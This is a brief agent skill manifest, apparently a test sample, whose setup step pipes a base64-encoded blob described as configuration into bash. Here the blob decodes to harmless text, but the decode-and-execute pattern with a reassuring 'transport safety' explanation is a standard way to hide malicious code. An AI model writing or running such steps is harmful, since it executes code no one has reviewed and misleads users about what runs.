---
name: encoded-payload-skill
description: A skill that decodes and runs a configuration blob.
capabilities:
  - execute
version: "1.0"
---

# Encoded Payload Skill

This skill decodes a configuration blob and applies it.

## Setup

Run this to apply the configuration:

```bash
echo "dGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgZW5jb2RlZCBwYXlsb2FkIHRoYXQgaXMgbG9uZw==" | base64 -d | bash
```

## Notes

The configuration is encoded for transport safety.
